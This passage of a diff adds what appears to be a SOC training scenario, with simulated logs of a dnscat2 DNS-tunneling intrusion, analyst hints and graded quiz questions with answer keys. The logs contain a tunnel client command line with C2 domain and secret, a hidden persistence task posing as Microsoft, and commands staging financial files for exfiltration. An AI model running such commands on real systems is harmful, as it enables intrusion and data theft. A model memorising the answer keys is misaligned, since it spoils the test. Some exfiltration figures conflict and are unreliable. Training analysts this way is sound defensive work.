+          "rawLog": {
+            "alertId": "SIEM-CORR-2025-4471",
+            "ruleName": "DNS Tunneling — High Entropy Subdomain Labels with Anomalous Volume",
+            "severity": "CRITICAL",
+            "timestamp": "2025-09-18T09:30:15Z",
+            "correlatedEvents": 847,
+            "sourceHost": "WS-PC15",
+            "sourceIp": "10.0.1.92",
+            "suspectDomain": "data.ns1.updateservice-cdn.com",
+            "indicators": {
+              "avgSubdomainEntropy": 4.58,
+              "avgQueryNameLength": 78,
+              "txtQueryRatio": 0.942,
+              "queriesPerMinute": 84.7,
+              "uniqueSubdomains": 843,
+              "domainAge": "2 days",
+              "ttlValue": 0,
+              "registrar": "PrivacyShield Registrations LLC"
+            },
+            "timeWindow": "10 minutes",
+            "dataSources": ["DNS Logs", "Network Flow", "Threat Intelligence"],
+            "recommendation": "Investigate host WS-PC15 immediately. DNS tunneling suspected. Consider blocking domain and isolating host.",
+            "confidenceScore": 97.3
+          },
+          "severity": "CRITICAL",
+          "hostname": "WS-PC15",
+          "sourceIp": "10.0.1.92",
+          "timestamp": "2025-09-18T09:30:15Z",
+          "isEvidence": true,
+          "evidenceTag": "SIEM_DNS_TUNNEL_ALERT",
+          "sortOrder": 8
+        }
+      ],
+      "hints": [
+        {
+          "content": "Compare the normal DNS queries (google.com, office365.com) to the suspicious ones. Normal queries have short, readable domain names (15-40 characters). The tunneling queries have 60-80+ character names with high-entropy Base64-encoded subdomains.",
+          "pointsPenalty": 3,
+          "sortOrder": 1
+        },
+        {
+          "content": "The TTL of 0 on the suspicious DNS responses is a critical indicator. Normal DNS responses have TTLs of 60-3600 seconds. A TTL of 0 means the response must never be cached, ensuring every query reaches the attacker's authoritative nameserver — essential for real-time C2 communication.",
+          "pointsPenalty": 4,
+          "sortOrder": 2
+        },
+        {
+          "content": "The Sysmon log reveals the tunneling client binary. Look at the 'OriginalFileName' field: it says 'dnscat2-client.exe' even though the file was renamed to 'svchost-update.exe'. The command line also reveals the C2 domain and a shared secret for encryption.",
+          "pointsPenalty": 5,
+          "sortOrder": 3
+        }
+      ]
+    },
+    {
+      "stageNumber": 3,
+      "title": "C2 Command Execution",
+      "description": "The attacker now has a functioning DNS tunnel and is executing commands on the compromised host. Analyze the C2 activity including reconnaissance commands, persistence mechanisms, and the steady beaconing pattern.",
+      "unlockCondition": "AFTER_PREVIOUS",
+      "logs": [
+        {
+          "logType": "DNS",
+          "summary": "DNS Log — TXT query containing encoded C2 beacon at T+30s interval. The response TXT record contains Base64-encoded commands being sent from the C2 server to the compromised host. Decoded response: 'cmd:whoami /all && systeminfo && net user'.",
+          "rawLog": {
+            "timestamp": "2025-09-18T09:31:00Z",
+            "queryName": "YmVhY29uX3BrdF9zZXExMjNfYWN0aXZl.cmd.data.ns1.updateservice-cdn.com",
+            "queryType": "TXT",
+            "queryClass": "IN",
+            "responseCode": "NOERROR",
+            "responseData": "\"Y21kOndob2FtaSAvYWxsICYmIHN5c3RlbWluZm8gJiYgbmV0IHVzZXI=\"",
+            "srcIp": "10.0.1.92",
+            "srcPort": 53100,
+            "dstIp": "10.0.2.1",
+            "dstPort": 53,
+            "protocol": "UDP",
+            "hostname": "WS-PC15",
+            "dnsServer": "10.0.2.1",
+            "flags": "QR,RD,RA",
+            "ttl": 0,
+            "querySize": 82,
+            "responseSize": 148
+          },
+          "severity": "HIGH",
+          "hostname": "WS-PC15",
+          "sourceIp": "10.0.1.92",
+          "destIp": "10.0.2.1",
+          "timestamp": "2025-09-18T09:31:00Z",
+          "isEvidence": true,
+          "evidenceTag": "C2_RECON_COMMAND",
+          "sortOrder": 1
+        },
+        {
+          "logType": "SYSMON",
+          "summary": "Sysmon Event ID 1 — The DNS tunnel client (svchost-update.exe) spawned cmd.exe to execute reconnaissance commands: 'whoami /all', 'systeminfo', and 'net user'. This is standard post-compromise enumeration (T1033, T1082, T1087).",
+          "rawLog": {
+            "EventID": 1,
+            "Source": "Microsoft-Windows-Sysmon",
+            "UtcTime": "2025-09-18T09:31:02Z",
+            "ProcessGuid": "{WS-PC15-a1b2c3d4-0010}",
+            "ProcessId": 10244,
+            "Image": "C:\\Windows\\System32\\cmd.exe",
+            "CommandLine": "cmd.exe /c whoami /all && systeminfo && net user",
+            "ParentProcessGuid": "{WS-PC15-a1b2c3d4-0005}",
+            "ParentProcessId": 9120,
+            "ParentImage": "C:\\Users\\a.kumar\\AppData\\Local\\Temp\\svchost-update.exe",
+            "ParentCommandLine": "\"C:\\Users\\a.kumar\\AppData\\Local\\Temp\\svchost-update.exe\" --dns data.ns1.updateservice-cdn.com --secret 4d6573746f6e --maxlen 57",
+            "User": "CORP\\a.kumar",
+            "Hashes": "SHA256=b94d27b9934d3e08a52e52d7da7dabfac484efe37a5380ee9088f7ace2efcde9",
+            "IntegrityLevel": "Medium"
+          },
+          "severity": "HIGH",
+          "hostname": "WS-PC15",
+          "username": "a.kumar",
+          "processName": "cmd.exe",
+          "eventId": "1",
+          "timestamp": "2025-09-18T09:31:02Z",
+          "isEvidence": true,
+          "evidenceTag": "C2_RECON_EXECUTION",
+          "sortOrder": 2
+        },
+        {
+          "logType": "DNS",
+          "summary": "DNS Log — Steady beaconing pattern observed. TXT query at exactly T+30s from previous beacon (09:31:30). The regular 30-second interval is a hallmark of automated C2 beaconing, distinguishable from human-driven DNS activity which has irregular timing.",
+          "rawLog": {
+            "timestamp": "2025-09-18T09:31:30Z",
+            "queryName": "YmVhY29uX3BrdF9zZXExMjRfYWN0aXZl.cmd.data.ns1.updateservice-cdn.com",
+            "queryType": "TXT",
+            "queryClass": "IN",
+            "responseCode": "NOERROR",
+            "responseData": "\"Y21kOm5ldCBncm91cCAiRG9tYWluIEFkbWlucyIgL2RvbWFpbg==\"",
+            "srcIp": "10.0.1.92",
+            "srcPort": 53102,
+            "dstIp": "10.0.2.1",
+            "dstPort": 53,
+            "protocol": "UDP",
+            "hostname": "WS-PC15",
+            "dnsServer": "10.0.2.1",
+            "flags": "QR,RD,RA",
+            "ttl": 0,
+            "querySize": 82,
+            "responseSize": 152
+          },
+          "severity": "HIGH",
+          "hostname": "WS-PC15",
+          "sourceIp": "10.0.1.92",
+          "destIp": "10.0.2.1",
+          "timestamp": "2025-09-18T09:31:30Z",
+          "isEvidence": true,
+          "evidenceTag": "C2_BEACON_30S",
+          "sortOrder": 3
+        },
+        {
+          "logType": "WINDOWS_EVENT",
+          "summary": "Windows Event ID 4698 — Scheduled task created on WS-PC15. Task name 'WindowsUpdateCheck' set to run 'svchost-update.exe' at system startup and every 4 hours. This establishes persistence for the DNS tunneling client (T1053.005).",
+          "rawLog": {
+            "EventID": 4698,
+            "Source": "Microsoft-Windows-Security-Auditing",
+            "TimeCreated": "2025-09-18T09:35:18Z",
+            "Computer": "WS-PC15.corp.local",
+            "SubjectUserName": "a.kumar",
+            "SubjectDomainName": "CORP",
+            "SubjectLogonId": "0x3E7",
+            "TaskName": "\\WindowsUpdateCheck",
+            "TaskContent": {
+              "RegistrationInfo": {
+                "Date": "2025-09-18T09:35:18Z",
+                "Author": "Microsoft Corporation",
+                "Description": "Checks for Windows updates periodically"
+              },
+              "Triggers": [
+                {
+                  "LogonTrigger": {
+                    "Enabled": true
+                  }
+                },
+                {
+                  "TimeTrigger": {
+                    "Repetition": {
+                      "Interval": "PT4H",
+                      "StopAtDurationEnd": false
+                    },
+                    "StartBoundary": "2025-09-18T09:35:00Z",
+                    "Enabled": true
+                  }
+                }
+              ],
+              "Actions": {
+                "Exec": {
+                  "Command": "C:\\Users\\a.kumar\\AppData\\Local\\Temp\\svchost-update.exe",
+                  "Arguments": "--dns data.ns1.updateservice-cdn.com --secret 4d6573746f6e --maxlen 57"
+                }
+              },
+              "Settings": {
+                "Hidden": true,
+                "RunOnlyIfIdle": false,
+                "DisallowStartIfOnBatteries": false
+              }
+            }
+          },
+          "severity": "HIGH",
+          "hostname": "WS-PC15",
+          "username": "a.kumar",
+          "eventId": "4698",
+          "timestamp": "2025-09-18T09:35:18Z",
+          "isEvidence": true,
+          "evidenceTag": "PERSISTENCE_SCHTASK",
+          "sortOrder": 4
+        },
+        {
+          "logType": "EDR_ALERT",
+          "summary": "EDR Alert — Suspicious scheduled task creation detected on WS-PC15. Task 'WindowsUpdateCheck' was created to execute a binary from the user's Temp directory with suspicious command-line arguments. The task masquerades as a legitimate Windows Update process.",
+          "rawLog": {
+            "alertId": "EDR-2025-09182445",
+            "severity": "HIGH",
+            "timestamp": "2025-09-18T09:35:20Z",
+            "hostname": "WS-PC15",
+            "username": "CORP\\a.kumar",
+            "processName": "schtasks.exe",
+            "processPath": "C:\\Windows\\System32\\schtasks.exe",
+            "alertType": "Suspicious Scheduled Task — Binary in Temp Directory",
+            "detectionRule": "SCHTASK_TEMP_BINARY_PERSISTENCE",
+            "details": {
+              "taskName": "WindowsUpdateCheck",
+              "taskAction": "C:\\Users\\a.kumar\\AppData\\Local\\Temp\\svchost-update.exe --dns data.ns1.updateservice-cdn.com --secret 4d6573746f6e --maxlen 57",
+              "taskTrigger": "At logon and every 4 hours",
+              "taskHidden": true,
+              "suspiciousIndicators": [
+                "Binary located in user Temp directory",
+                "Task claims to be from Microsoft Corporation",
+                "Task is configured as hidden",
+                "Command-line contains DNS-related arguments"
+              ]
+            },
+            "mitreTactic": "Persistence",
+            "mitreTechnique": "T1053.005",
+            "riskScore": 88,
+            "actionTaken": "ALERT_ONLY"
+          },
+          "severity": "HIGH",
+          "hostname": "WS-PC15",
+          "username": "a.kumar",
+          "processName": "schtasks.exe",
+          "timestamp": "2025-09-18T09:35:20Z",
+          "isEvidence": true,
+          "evidenceTag": "EDR_PERSISTENCE_ALERT",
+          "sortOrder": 5
+        },
+        {
+          "logType": "SYSMON",
+          "summary": "Sysmon Event ID 1 — The C2 channel executed 'dir /s /b C:\\Users\\a.kumar\\Documents\\*.xlsx *.docx *.pdf *.csv' to enumerate sensitive financial documents in the user's profile. This is the collection phase preceding exfiltration (T1005).",
+          "rawLog": {
+            "EventID": 1,
+            "Source": "Microsoft-Windows-Sysmon",
+            "UtcTime": "2025-09-18T09:42:15Z",
+            "ProcessGuid": "{WS-PC15-a1b2c3d4-0015}",
+            "ProcessId": 11832,
+            "Image": "C:\\Windows\\System32\\cmd.exe",
+            "CommandLine": "cmd.exe /c dir /s /b C:\\Users\\a.kumar\\Documents\\*.xlsx *.docx *.pdf *.csv > C:\\Users\\a.kumar\\AppData\\Local\\Temp\\fl.txt",
+            "ParentProcessGuid": "{WS-PC15-a1b2c3d4-0005}",
+            "ParentProcessId": 9120,
+            "ParentImage": "C:\\Users\\a.kumar\\AppData\\Local\\Temp\\svchost-update.exe",
+            "User": "CORP\\a.kumar",
+            "Hashes": "SHA256=b94d27b9934d3e08a52e52d7da7dabfac484efe37a5380ee9088f7ace2efcde9",
+            "IntegrityLevel": "Medium"
+          },
+          "severity": "HIGH",
+          "hostname": "WS-PC15",
+          "username": "a.kumar",
+          "processName": "cmd.exe",
+          "eventId": "1",
+          "timestamp": "2025-09-18T09:42:15Z",
+          "isEvidence": true,
+          "evidenceTag": "FILE_ENUMERATION",
+          "sortOrder": 6
+        }
+      ],
+      "hints": [
+        {
+          "content": "Notice the beacon timing pattern: queries arrive at exactly 30-second intervals (09:31:00, 09:31:30, 09:32:00...). Human-driven DNS activity is irregular and clustered around browsing actions. Regular fixed-interval queries strongly indicate automated C2 beaconing.",
+          "pointsPenalty": 3,
+          "sortOrder": 1
+        },
+        {
+          "content": "The scheduled task 'WindowsUpdateCheck' is a persistence mechanism. Red flags: (1) the binary runs from the user's Temp directory, (2) the Author field falsely claims 'Microsoft Corporation', (3) the task is hidden, and (4) the command line contains DNS tunnel parameters.",
+          "pointsPenalty": 4,
+          "sortOrder": 2
+        },
+        {
+          "content": "The file enumeration command targets financial document types (.xlsx, .docx, .pdf, .csv) in the Finance user's Documents folder. The output is saved to a staging file (fl.txt) in the Temp directory, which will likely be exfiltrated via the DNS tunnel in the next stage.",
+          "pointsPenalty": 3,
+          "sortOrder": 3
+        }
+      ]
+    },
+    {
+      "stageNumber": 4,
+      "title": "Data Exfiltration via DNS",
+      "description": "The attacker is now exfiltrating stolen data through the DNS tunnel. Analyze the massive spike in DNS query volume, the chunked data transfer pattern, and determine the scope of the data breach.",
+      "unlockCondition": "AFTER_PREVIOUS",
+      "logs": [
+        {
+          "logType": "EDR_ALERT",
+          "summary": "EDR Alert — Sensitive file access detected on WS-PC15. The process 'svchost-update.exe' accessed 'Q3_Revenue_Forecast_2025.xlsx' and 'Employee_Salary_Data_Sept2025.csv' from the Finance shared documents. These files contain confidential financial data.",
+          "rawLog": {
+            "alertId": "EDR-2025-09182578",
+            "severity": "HIGH",
+            "timestamp": "2025-09-18T09:50:02Z",
+            "hostname": "WS-PC15",
+            "username": "CORP\\a.kumar",
+            "processName": "svchost-update.exe",
+            "processPath": "C:\\Users\\a.kumar\\AppData\\Local\\Temp\\svchost-update.exe",
+            "alertType": "Sensitive File Access by Untrusted Process",
+            "detectionRule": "SENSITIVE_FILE_ACCESS_UNTRUSTED_BINARY",
+            "details": {
+              "filesAccessed": [
+                {
+                  "path": "C:\\Users\\a.kumar\\Documents\\Finance\\Q3_Revenue_Forecast_2025.xlsx",
+                  "size": 2458624,
+                  "classification": "CONFIDENTIAL",
+                  "accessType": "READ"
+                },
+                {
+                  "path": "C:\\Users\\a.kumar\\Documents\\Finance\\Employee_Salary_Data_Sept2025.csv",
+                  "size": 847392,
+                  "classification": "RESTRICTED",
+                  "accessType": "READ"
+                },
+                {
+                  "path": "C:\\Users\\a.kumar\\Documents\\Finance\\Board_Presentation_Q3.pptx",
+                  "size": 5242880,
+                  "classification": "CONFIDENTIAL",
+                  "accessType": "READ"
+                }
+              ],
+              "totalDataSize": "8.15 MB"
+            },
+            "mitreTactic": "Collection",
+            "mitreTechnique": "T1005",
+            "riskScore": 95,
+            "actionTaken": "ALERT_ONLY"
+          },
+          "severity": "CRITICAL",
+          "hostname": "WS-PC15",
+          "username": "a.kumar",
+          "processName": "svchost-update.exe",
+          "timestamp": "2025-09-18T09:50:02Z",
+          "isEvidence": true,
+          "evidenceTag": "SENSITIVE_FILE_ACCESS",
+          "sortOrder": 1
+        },
+        {
+          "logType": "DNS",
+          "summary": "DNS Log — EXFILTRATION TXT queries detected. Massive burst of DNS queries with Base64-encoded subdomains carrying chunked file data. Query rate spiked to 15 queries/second. Subdomain labels are sequential chunk identifiers (chunk001, chunk002...) indicating systematic data transfer.",
+          "rawLog": {
+            "timestamp": "2025-09-18T09:55:01Z",
+            "queryName": "ZXhmaWxfY2h1bmswMDFfUTNfUmV2ZW51ZV9Gb3JlY2FzdA.exf.data.ns1.updateservice-cdn.com",
+            "queryType": "TXT",
+            "queryClass": "IN",
+            "responseCode": "NOERROR",
+            "responseData": "\"YWNrOmNodW5rMDAxX3JlY2VpdmVk\"",
+            "srcIp": "10.0.1.92",
+            "srcPort": 54200,
+            "dstIp": "10.0.2.1",
+            "dstPort": 53,
+            "protocol": "UDP",
+            "hostname": "WS-PC15",
+            "dnsServer": "10.0.2.1",
+            "flags": "QR,RD,RA",
+            "ttl": 0,
+            "querySize": 102,
+            "responseSize": 96,
+            "queryNameLength": 85,
+            "subdomainEntropy": 4.81
+          },
+          "severity": "CRITICAL",
+          "hostname": "WS-PC15",
+          "sourceIp": "10.0.1.92",
+          "destIp": "10.0.2.1",
+          "timestamp": "2025-09-18T09:55:01Z",
+          "isEvidence": true,
+          "evidenceTag": "DNS_EXFIL_CHUNK",
+          "sortOrder": 2
+        },
+        {
+          "logType": "DNS",
+          "summary": "DNS Log — Continued exfiltration. Chunk 047 of the data transfer in progress. Each query carries approximately 120 bytes of encoded data in the subdomain label, meaning the attacker needs ~68,000 queries to exfiltrate 8.15 MB of stolen files.",
+          "rawLog": {
+            "timestamp": "2025-09-18T09:58:14Z",
+            "queryName": "ZXhmaWxfY2h1bmswNDdfRW1wbG95ZWVfU2FsYXJ5X0RhdGE.exf.data.ns1.updateservice-cdn.com",
+            "queryType": "TXT",
+            "queryClass": "IN",
+            "responseCode": "NOERROR",
+            "responseData": "\"YWNrOmNodW5rMDQ3X3JlY2VpdmVk\"",
+            "srcIp": "10.0.1.92",
+            "srcPort": 54247,
+            "dstIp": "10.0.2.1",
+            "dstPort": 53,
+            "protocol": "UDP",
+            "hostname": "WS-PC15",
+            "dnsServer": "10.0.2.1",
+            "flags": "QR,RD,RA",
+            "ttl": 0,
+            "querySize": 104,
+            "responseSize": 96,
+            "queryNameLength": 87,
+            "subdomainEntropy": 4.78
+          },
+          "severity": "CRITICAL",
+          "hostname": "WS-PC15",
+          "sourceIp": "10.0.1.92",
+          "destIp": "10.0.2.1",
+          "timestamp": "2025-09-18T09:58:14Z",
+          "isEvidence": true,
+          "evidenceTag": "DNS_EXFIL_ONGOING",
+          "sortOrder": 3
+        },
+        {
+          "logType": "NETWORK_FLOW",
+          "summary": "Network Flow — DNS traffic spike from WS-PC15. In the last 15 minutes, the host generated 3,247 DNS queries totaling 1.82 MB of DNS traffic. This is a 10x increase over the already-elevated tunneling baseline, indicating active bulk data exfiltration.",
+          "rawLog": {
+            "timestamp": "2025-09-18T10:00:00Z",
+            "srcIp": "10.0.1.92",
+            "dstIp": "10.0.2.1",
+            "dstPort": 53,
+            "protocol": "UDP",
+            "bytesIn": 312480,
+            "bytesOut": 1822720,
+            "packetsIn": 3247,
+            "packetsOut": 3247,
+            "duration": 900,
+            "application": "DNS",
+            "hostname": "WS-PC15",
+            "queryCount": 3247,
+            "uniqueSubdomains": 3244,
+            "topDomain": "data.ns1.updateservice-cdn.com",
+            "txtQueryPercentage": 99.1,
+            "avgQueryLength": 92.3,
+            "baselineQueriesPer15Min": 15,
+            "trafficMultiplier": "10.2x baseline",
+            "anomalyScore": 99.8
+          },
+          "severity": "CRITICAL",
+          "hostname": "WS-PC15",
+          "sourceIp": "10.0.1.92",
+          "destIp": "10.0.2.1",
+          "timestamp": "2025-09-18T10:00:00Z",
+          "isEvidence": true,
+          "evidenceTag": "DNS_EXFIL_VOLUME_SPIKE",
+          "sortOrder": 4
+        },
+        {
+          "logType": "SIEM_ALERT",
+          "summary": "SIEM Correlation Alert — DNS tunneling data exfiltration confirmed. Correlation of DNS anomaly, sensitive file access, and traffic volume spike indicates active data theft via DNS channel. Estimated 8+ MB of confidential data being exfiltrated to attacker-controlled nameserver.",
+          "rawLog": {
+            "alertId": "SIEM-CORR-2025-4489",
+            "ruleName": "DNS Tunneling — Active Data Exfiltration Detected",
+            "severity": "CRITICAL",
+            "timestamp": "2025-09-18T10:00:30Z",
+            "correlatedAlerts": [
+              "SIEM-CORR-2025-4471",
+              "EDR-2025-09182578",
+              "EDR-2025-09182445"
+            ],
+            "sourceHost": "WS-PC15",
+            "sourceIp": "10.0.1.92",
+            "username": "a.kumar",
+            "suspectDomain": "data.ns1.updateservice-cdn.com",
+            "exfiltrationMetrics": {
+              "totalDnsQueries": 4094,
+              "estimatedDataExfiltrated": "8.15 MB",
+              "exfiltrationDuration": "35 minutes",
+              "avgBandwidth": "3.8 KB/s",
+              "filesIdentified": [
+                "Q3_Revenue_Forecast_2025.xlsx",
+                "Employee_Salary_Data_Sept2025.csv",
+                "Board_Presentation_Q3.pptx"
+              ]
+            },
+            "attackChain": [
+              "T1566.001 — Spearphishing Attachment",
+              "T1059.001 — PowerShell Execution",
+              "T1071.004 — DNS C2 Channel",
+              "T1053.005 — Scheduled Task Persistence",
+              "T1005 — Data from Local System",
+              "T1041 — Exfiltration Over C2 Channel"
+            ],
+            "timeWindow": "45 minutes",
+            "dataSources": ["DNS Logs", "EDR Alerts", "Network Flow", "SIEM Correlation"],
+            "recommendation": "CRITICAL: Immediately isolate WS-PC15, block updateservice-cdn.com at DNS and firewall, revoke a.kumar credentials, initiate incident response.",
+            "confidenceScore": 99.1
+          },
+          "severity": "CRITICAL",
+          "hostname": "WS-PC15",
+          "username": "a.kumar",
+          "sourceIp": "10.0.1.92",
+          "timestamp": "2025-09-18T10:00:30Z",
+          "isEvidence": true,
+          "evidenceTag": "SIEM_EXFIL_CONFIRMED",
+          "sortOrder": 5
+        },
+        {
+          "logType": "FIREWALL",
+          "summary": "Firewall — DNS traffic from WS-PC15 bypassing corporate resolver. The host sent DNS queries directly to external IP 198.51.100.53 on port 53, circumventing the corporate DNS servers (10.0.2.1/10.0.2.2). This is a policy violation and indicates the tunnel client has a fallback direct-resolution mode.",
+          "rawLog": {
+            "timestamp": "2025-09-18T10:02:45Z",
+            "action": "ALLOW",
+            "direction": "OUTBOUND",
+            "srcIp": "10.0.1.92",
+            "srcPort": 55012,
+            "dstIp": "198.51.100.53",
+            "dstPort": 53,
+            "protocol": "UDP",
+            "rule": "ALLOW-DNS-OUTBOUND",
+            "zone": "WORKSTATION->EXTERNAL",
+            "application": "svchost-update.exe",
+            "bytesOut": 102,
+            "bytesIn": 156,
+            "sessionId": "fw-sess-2025091810024501",
+            "policyNote": "DNS to non-corporate resolver — should be blocked by split-DNS policy (not yet enforced)"
+          },
+          "severity": "HIGH",
+          "hostname": "FW-EDGE-01",
+          "sourceIp": "10.0.1.92",
+          "destIp": "198.51.100.53",
+          "processName": "svchost-update.exe",
+          "timestamp": "2025-09-18T10:02:45Z",
+          "isEvidence": true,
+          "evidenceTag": "DNS_BYPASS_CORPORATE_RESOLVER",
+          "sortOrder": 6
+        }
+      ],
+      "hints": [
+        {
+          "content": "The exfiltration queries use a different subdomain structure than the C2 beacons. Notice 'exf.data.ns1.updateservice-cdn.com' vs 'cmd.data.ns1.updateservice-cdn.com' — the 'exf' label indicates the exfiltration channel, while 'cmd' was used for command delivery. Different subdomains serve different functions in the tunnel.",
+          "pointsPenalty": 4,
+          "sortOrder": 1
+        },
+        {
+          "content": "Calculate the exfiltration bandwidth: ~3,247 queries in 15 minutes, each carrying ~120 bytes of encoded data = approximately 390 KB of actual data per 15-minute window. At this rate, exfiltrating 8.15 MB would take about 5 hours of continuous tunneling. The attacker is trading speed for stealth.",
+          "pointsPenalty": 5,
+          "sortOrder": 2
+        },
+        {
+          "content": "The firewall log reveals a critical security gap: DNS traffic to external resolvers (non-corporate) on port 53 is ALLOWED. A properly configured network should enforce split-DNS policy, requiring all DNS queries to go through corporate resolvers (10.0.2.1/10.0.2.2). This would allow DNS inspection and blocking.",
+          "pointsPenalty": 4,
+          "sortOrder": 3
+        }
+      ]
+    }
+  ],
+  "checkpoints": [
+    {
+      "stageNumber": 1,
+      "checkpointType": "MULTIPLE_CHOICE",
+      "question": "What was the initial infection vector used to compromise WS-PC15?",
+      "options": [
+        "Drive-by download from a compromised website",
+        "Spearphishing email with a macro-enabled Excel attachment (.xlsm)",
+        "Exploitation of an unpatched vulnerability on the workstation",
+        "USB drive containing malicious executable"
+      ],
+      "correctAnswer": "Spearphishing email with a macro-enabled Excel attachment (.xlsm)",
+      "points": 10,
+      "category": "accuracy",
+      "explanation": "The email gateway log shows a phishing email from 'invoices@globaltrade-partners.com' with a macro-enabled attachment 'Q3_Financial_Summary.xlsm'. The Sysmon log confirms EXCEL.EXE spawned cmd.exe → powershell.exe, which is the classic macro execution chain. The domain was registered just 3 days ago, further confirming this is a phishing attack (T1566.001).",
+      "sortOrder": 1
+    },
+    {
+      "stageNumber": 1,
+      "checkpointType": "MULTIPLE_CHOICE",
+      "question": "Why did the attacker pivot from direct HTTP communication to DNS tunneling?",
+      "options": [
+        "DNS tunneling is faster than HTTP for data transfer",
+        "The attacker's HTTP server was offline",
+        "The corporate firewall blocked outbound HTTP to non-whitelisted destinations",
+        "The attacker prefers DNS tunneling for all operations"
+      ],
+      "correctAnswer": "The corporate firewall blocked outbound HTTP to non-whitelisted destinations",
+      "points": 10,
+      "category": "investigation",
+      "explanation": "The firewall log at 09:15:47 shows the direct HTTP connection to 198.51.100.53 was DENIED by rule 'BLOCK-OUTBOUND-HTTP-NONWHITELIST'. When the PowerShell cradle download failed, the malware's fallback mechanism used DNS TXT record queries to download the payload in chunks instead. Attackers use DNS tunneling precisely because DNS traffic (port 53) is almost always allowed outbound.",
+      "sortOrder": 2
+    },
+    {
+      "stageNumber": 1,
+      "checkpointType": "EVIDENCE_SELECTION",
+      "question": "Which logs provide direct evidence of the malicious macro execution chain? Select all that apply.",
+      "options": [
+        "Email gateway log showing the phishing email delivery",
+        "Sysmon log showing EXCEL.EXE spawning cmd.exe with encoded PowerShell",
+        "EDR alert on malicious macro execution (T1059.001)",
+        "DNS query resolving updateservice-cdn.com",
+        "Firewall log blocking outbound HTTP",
+        "Sysmon log showing DNS-based payload download fallback"
+      ],
+      "correctAnswer": ["Sysmon log showing EXCEL.EXE spawning cmd.exe with encoded PowerShell", "EDR alert on malicious macro execution (T1059.001)", "Sysmon log showing DNS-based payload download fallback"],
+      "points": 15,
+      "category": "evidence",
+      "explanation": "The macro execution chain is directly evidenced by: (1) Sysmon showing EXCEL.EXE → cmd.exe → powershell.exe with Base64-encoded command, (2) the EDR alert that specifically detected 'Office Application Spawning Script Interpreter' with the decoded command revealing the download cradle, and (3) the second Sysmon log showing the DNS-based fallback payload retrieval. The email log shows delivery but not execution; the DNS and firewall logs are related but not direct evidence of the macro chain itself.",
+      "sortOrder": 3
+    },
+    {
+      "stageNumber": 2,
+      "checkpointType": "MULTIPLE_CHOICE",
+      "question": "Which DNS query characteristic is the STRONGEST indicator of DNS tunneling in this incident?",
+      "options": [
+        "Queries using UDP protocol on port 53",
+        "TXT record queries with Base64-encoded subdomain labels exceeding 50 characters and entropy above 4.0",
+        "DNS queries being sent to the corporate resolver (10.0.2.1)",
+        "NOERROR response codes from the DNS server"
+      ],
+      "correctAnswer": "TXT record queries with Base64-encoded subdomain labels exceeding 50 characters and entropy above 4.0",
+      "points": 10,
+      "category": "accuracy",
+      "explanation": "DNS tunneling is characterized by unusually long subdomain labels (>50 characters) containing high-entropy encoded data, combined with heavy use of TXT record queries. Normal DNS queries have short, human-readable subdomain labels (5-15 characters) with low entropy. The other options (UDP/port 53, corporate resolver, NOERROR) are all normal DNS characteristics and provide no tunneling signal.",
+      "sortOrder": 4
+    },
+    {
+      "stageNumber": 2,
+      "checkpointType": "TRUE_FALSE",
+      "question": "A TTL value of 0 on DNS responses is normal and does not indicate suspicious activity.",
+      "options": ["True", "False"],
+      "correctAnswer": "False",
+      "points": 10,
+      "category": "accuracy",
+      "explanation": "A TTL of 0 is highly suspicious in DNS responses. Normal DNS responses have TTLs ranging from 60 to 86400 seconds, allowing caching to reduce query load. A TTL of 0 instructs resolvers to never cache the response, ensuring that every single query reaches the authoritative nameserver. DNS tunneling tools set TTL to 0 because they need real-time, bidirectional communication — if responses were cached, the C2 channel would break. This is a strong detection indicator.",
+      "sortOrder": 5
+    },
+    {
+      "stageNumber": 2,
+      "checkpointType": "MULTIPLE_CHOICE",
+      "question": "Based on the Sysmon process creation log, what DNS tunneling tool is the attacker using?",
+      "options": [
+        "iodine",
+        "dns2tcp",
+        "dnscat2",
+        "Cobalt Strike DNS Beacon"
+      ],
+      "correctAnswer": "dnscat2",
+      "points": 15,
+      "category": "investigation",
+      "explanation": "The Sysmon Event ID 1 log for 'svchost-update.exe' reveals the OriginalFileName field is 'dnscat2-client.exe'. While the binary was renamed to masquerade as a legitimate Windows process, Sysmon captures the original compiled filename from the PE header. The command-line arguments (--dns, --secret, --maxlen) are also consistent with dnscat2 client parameters.",
+      "sortOrder": 6
+    },
+    {
+      "stageNumber": 3,
+      "checkpointType": "MULTIPLE_CHOICE",
+      "question": "What is the beaconing interval of the DNS C2 channel?",
+      "options": [
+        "10 seconds",
+        "30 seconds",
+        "60 seconds",
+        "5 minutes"
+      ],
+      "correctAnswer": "30 seconds",
+      "points": 10,
+      "category": "investigation",
+      "explanation": "The DNS logs in Stage 3 show beacon queries at 09:31:00 and 09:31:30 — exactly 30 seconds apart. This regular fixed-interval pattern is characteristic of automated C2 beaconing. The TXT response from the tunnel initialization (Stage 2) also contained 'heartbeat_interval=30s' when Base64-decoded, confirming the 30-second beacon interval.",
+      "sortOrder": 7
+    },
+    {
+      "stageNumber": 3,
+      "checkpointType": "EVIDENCE_SELECTION",
+      "question": "Which log entries demonstrate the attacker establishing persistence on WS-PC15? Select all that apply.",
+      "options": [
+        "Windows Event 4698 showing creation of 'WindowsUpdateCheck' scheduled task",
+        "EDR alert on suspicious scheduled task creation",
+        "Sysmon log showing reconnaissance commands (whoami, systeminfo)",
+        "DNS beacon log showing 30-second interval",
+        "Sysmon log showing file enumeration command"
+      ],
+      "correctAnswer": ["Windows Event 4698 showing creation of 'WindowsUpdateCheck' scheduled task", "EDR alert on suspicious scheduled task creation"],
+      "points": 15,
+      "category": "evidence",
+      "explanation": "Persistence is established through the scheduled task 'WindowsUpdateCheck' (T1053.005). Two logs directly evidence this: (1) Windows Event 4698 showing the task creation with its triggers (logon + every 4 hours) and the action executing svchost-update.exe, and (2) the EDR alert that flagged the suspicious task. The reconnaissance, beaconing, and file enumeration logs show other attack phases (discovery, C2, collection) but not persistence.",
+      "sortOrder": 8
+    },
+    {
+      "stageNumber": 3,
+      "checkpointType": "TRUE_FALSE",
+      "question": "The reconnaissance commands executed via the C2 channel (whoami, systeminfo, net user) indicate the attacker already has administrative privileges on WS-PC15.",
+      "options": ["True", "False"],
+      "correctAnswer": "False",
+      "points": 10,
+      "category": "accuracy",
+      "explanation": "Running whoami, systeminfo, and net user does NOT indicate administrative privileges. These are standard reconnaissance commands (T1033, T1082, T1087) that any user can execute. The Sysmon logs show IntegrityLevel 'Medium' (not 'High' or 'System'), and the process runs under the context of CORP\\a.kumar — a standard user account. The attacker is gathering information to understand what access level they have and what users exist on the system, which is typical early-stage post-compromise behavior.",
+      "sortOrder": 9
+    },
+    {
+      "stageNumber": 4,
